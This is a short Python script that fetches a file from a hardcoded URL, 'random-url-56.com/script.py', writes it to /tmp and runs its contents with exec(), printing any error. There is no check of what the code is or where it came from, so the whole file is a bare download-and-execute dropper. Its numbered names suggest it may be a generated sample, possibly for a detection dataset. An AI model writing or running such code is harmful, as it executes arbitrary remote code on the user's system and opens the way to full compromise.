import urllib.request
import os

def download_script(url):
    with urllib.request.urlopen(url) as response:
        return response.read().decode()

def save_to_file(filename, script):
    with open(filename, "w") as file:
        file.write(script)

def read_from_file(filename):
    with open(filename, "r") as file:
        return file.read()

def execute_downloaded_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-56.com/script.py"
    local_file = "/tmp/script56.py"

    code = download_script(random_url)
    save_to_file(local_file, code)

    code_to_execute = read_from_file(local_file)
    execute_downloaded_code(code_to_execute)

main()
